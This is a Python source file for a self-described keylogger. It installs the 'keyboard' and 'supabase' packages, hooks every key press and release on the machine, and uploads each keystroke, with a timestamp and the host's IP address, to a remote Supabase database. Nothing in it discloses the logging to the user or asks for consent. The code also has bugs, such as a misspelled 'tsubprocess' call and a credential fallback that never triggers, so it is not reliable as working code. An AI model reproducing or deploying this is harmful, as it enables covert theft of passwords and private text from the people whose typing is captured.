import os
import sys
import subprocess
import socket
from datetime import datetime, timezone

requiredModules = ["supabase", "keyboard"]
venvName = "venv"


def activateVenv():
    subprocess.run([sys.executable, "-m", "venv", venvName])
    activateScriptPath = os.path.join(
        ".\\", venvName, "Scripts" if os.name == "nt" else "bin", "activate"
    )
    print(activateScriptPath)
    tsubprocess.run([activateScriptPath])


def installModules():
    for module in requiredModules:
        if not module in sys.modules:
            print(f"Installing {module}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", module])
            print(f"{module} installed successfully.")


activateVenv()
installModules()

from supabase import create_client, Client, PostgrestAPIError
import keyboard


class KeyLogger:
    def __init__(self) -> None:
        self.cache = {}

        self.db: Client = self.initializeDB()
        print("DB Initialized")

        self.ip = socket.gethostbyname(socket.gethostname())
        print(f"IP: {self.ip}")
        try:
            query = self.db.table("IP_ADDRESS").insert({"ip": self.ip})
            query.execute()
        except PostgrestAPIError as e:
            if e.code != "23505":
                raise e

        keyboard.hook(lambda e: self.onKeyboardAction(e))
        keyboard.wait("")

    def initializeDB(self) -> Client:
        try:
            url: str = os.environ.get("SUPABASE_URL")
            key: str = os.environ.get("SUPABASE_KEY")
        except Exception as e:
            url = "https://<your_supabase_url>.supabase.co"
            key = "<your_supabase_key>"
        return create_client(url, key)

    def onKeyboardAction(self, e: keyboard.KeyboardEvent) -> None:
        if e.event_type == keyboard.KEY_DOWN:
            self.onPress(e)
        elif e.event_type == keyboard.KEY_UP:
            self.onRelease(e)

    def onPress(self, event: keyboard._keyboard_event.KeyboardEvent) -> None:
        current_time = current_time = datetime.now(timezone.utc).strftime(
            "%Y-%m-%d %H:%M:%S.%f%z"
        )
        try:
            query = self.db.table("KEY_LOG").insert(
                {
                    "ip": self.ip,
                    "loggedAt": current_time,
                    "keyPressed": event.name,
                    "isKeyDown": True,
                }
            )
            query.execute()
        except Exception as e:
            print(e)

        print(f"IP:{self.ip} Time:{current_time} Key:{event.name}")

    def onRelease(self, event: keyboard._keyboard_event.KeyboardEvent) -> None:
        current_time = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f%z")
        try:
            query = self.db.table("KEY_LOG").insert(
                {
                    "ip": self.ip,
                    "loggedAt": current_time,
                    "keyPressed": event.name,
                    "isKeyDown": False,
                }
            )
            query.execute()
        except Exception as e:
            print(e)
        print(f"IP:{self.ip} Time:{current_time} ReleasedKey:{event.name}")


if __name__ == "__main__":
    # Driver Code
    kl = KeyLogger()
